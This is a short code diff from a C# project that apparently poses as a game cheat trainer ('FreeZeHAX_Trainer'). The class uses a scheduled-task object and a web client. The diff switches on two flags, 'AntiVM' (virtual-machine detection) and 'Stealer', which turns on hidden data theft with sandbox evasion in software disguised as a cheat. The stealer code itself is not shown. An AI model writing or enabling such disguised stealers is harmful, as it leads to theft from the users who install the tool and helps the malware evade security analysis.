@@ -35,8 +35,8 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
         private readonly WebClient web = new WebClient();
         private readonly string NewLine = Environment.NewLine;
-        private readonly bool AntiVM = false; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
-        private readonly bool Stealer = false; // Activate / Disable Stealer
+        private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
+        private readonly bool Stealer = true; // Activate / Disable Stealer
 
         private string GetCheat(int Number)
         {
